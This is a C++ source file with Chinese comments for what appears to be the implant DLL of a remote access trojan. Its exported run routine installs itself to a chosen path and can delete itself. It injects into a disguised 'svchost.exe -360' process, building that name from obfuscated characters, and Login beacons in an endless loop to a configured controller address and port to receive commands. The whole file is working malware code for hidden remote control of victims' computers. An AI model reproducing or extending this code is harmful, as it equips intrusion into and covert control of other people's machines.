// dllmain.cpp : 定义 DLL 应用程序的入口点。

#include "KernelManager.h"
#include"login.h"
#include"Install.h"
#include<shellapi.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

DWORD Login(ShellcodeStr* m_ShellcodeStr)
{
	//互斥上线地址:端口:服务名
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	char	strMutex[MAX_PATH];
	wsprintfA(strMutex, "%s:%d", m_ShellcodeStr->modify_data.DNS, m_ShellcodeStr->modify_data.Port);
	HANDLE m_hMutex = CreateMutex(NULL, FALSE, strMutex);
	if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS) // 防止重复运行
	{
		ReleaseMutex(m_hMutex);
		CloseHandle(m_hMutex);
		ExitProcess(0);
	}

	CClientSocket SocketClient;
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	//死循环上线
	///////////////////////////////////////////////////////////////////////////////////////////////////////////
	while (1)
	{
		//计算延迟  连接并计算延迟
		DWORD dwTickCount = GetTickCount();
		if (!SocketClient.Connect(m_ShellcodeStr->modify_data.DNS, m_ShellcodeStr->modify_data.Port))
		{
			continue;
		}
		DWORD upTickCount = GetTickCount() - dwTickCount;

		//连接后 实例化管理回调
		CKernelManager	manager(&SocketClient, m_ShellcodeStr->modify_data);
		SocketClient.setManagerCallBack(&manager);

		//请求激活
		BYTE	bToken = TOKEN_HEARTBEAT;
		SocketClient.Send((LPBYTE)&bToken, sizeof(bToken));

		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
		{
			Sleep(1000);
		}

		// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
		if (!manager.IsActived())
			continue;
		//发送登入信息  发送失败断开连接重连  发送成功就一直等待连接结束
		if (!sendLoginInfo(&SocketClient, upTickCount, m_ShellcodeStr->modify_data))
			continue;
		else
			SocketClient.run_event_loop();		
	}

}

DWORD __stdcall MainThread(ShellcodeStr* m_ShellcodeStr)
{
    HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Login, (void*)(m_ShellcodeStr), 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 1;
}


extern "C" __declspec(dllexport) BOOL  run(ShellcodeStr * m_ShellcodeStr)
{

	//创建互斥 存在就退出
	LPSTR lpCommandLine = GetCommandLine();
	char szEntryName[MAX_PATH] = { 0 };
	strcat(szEntryName, "nbclass\\");
	strcat(szEntryName, lpCommandLine);
	HANDLE  g_hMutexEntry = CreateMutex(NULL, FALSE, szEntryName);
	if (g_hMutexEntry && GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return FALSE;
	}
	
	//获取参数
	int argc = 0;
	PWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
	char svchost[] = { '\\','s','v','c',0,'o','s',0,'.','e','x','e',  ' '   ,'-','3','6','0',0 };
	svchost[4] = 'h';
	svchost[7] = 't';
	//如果等于1 代表首次运行 还没有参数
	if (argc == 1)
	{
		TCHAR lpFileName[MAX_PATH] = { 0, };
		if (!m_ShellcodeStr->modify_data.puppet)
		{
			if (m_ShellcodeStr->modify_data.ismove || m_ShellcodeStr->modify_data.selfDel)
			{

				strcat_s(lpFileName, m_ShellcodeStr->modify_data.ReleasePath);
				strcat_s(lpFileName, "\\");
				strcat_s(lpFileName, m_ShellcodeStr->modify_data.ReleaseName);
				CInstall::SingleInstance()->MyCreatDirector(lpFileName);
				CInstall::SingleInstance()->InstallFile(m_ShellcodeStr->modify_data);
			}

			MainThread(m_ShellcodeStr);
		}
		else
		{
			//判断是否需要移动文件
///////////////////////////////////////////////////////////////////////////////////////////////////////////	
			if (m_ShellcodeStr->modify_data.ismove)
			{
				strcat_s(lpFileName, m_ShellcodeStr->modify_data.ReleasePath);
				strcat_s(lpFileName, "\\");
				strcat_s(lpFileName, m_ShellcodeStr->modify_data.ReleaseName);
				CInstall::SingleInstance()->MyCreatDirector(lpFileName);
				CInstall::SingleInstance()->InstallFile(m_ShellcodeStr->modify_data);
			}

			//判断是否需要自删除
			if (m_ShellcodeStr->modify_data.selfDel)
			{
				//先把文件保存下来
				CInstall::SingleInstance()->SaveDeleteFile();
			}
		
			if (CInstall::SingleInstance()->PuppetProcess(svchost, m_ShellcodeStr, sizeof(ShellcodeStr)))
			{
				CloseHandle(g_hMutexEntry);
				if (m_ShellcodeStr->modify_data.kill)
				{
					ExitProcess(0);
				}
			}
			else
			{
				CloseHandle(g_hMutexEntry);
				return 0;
			}

	

		}
		

	}
	else if (argc > 1)
	{
		//参数是 --baidu上线
		///////////////////////////////////////////////////////////////////////////////////////////////////////////
		if (_wcsicmp(argv[1], L"-360") == 0)
		{
			//判断是否需要自删除
			if (m_ShellcodeStr->modify_data.selfDel)
			{
				CInstall::SingleInstance()->DeleteMe(m_ShellcodeStr->modify_data);
			}

			MainThread(m_ShellcodeStr);
		}
		else
		{
			if (CInstall::SingleInstance()->PuppetProcess(svchost, m_ShellcodeStr, sizeof(ShellcodeStr)))
			{
				CloseHandle(g_hMutexEntry);
				if (m_ShellcodeStr->modify_data.kill)
				{
					
					ExitProcess(0);
				}
			}
			else
			{
				CloseHandle(g_hMutexEntry);
				return 0;
			}
		}
	}
	return 0;
}



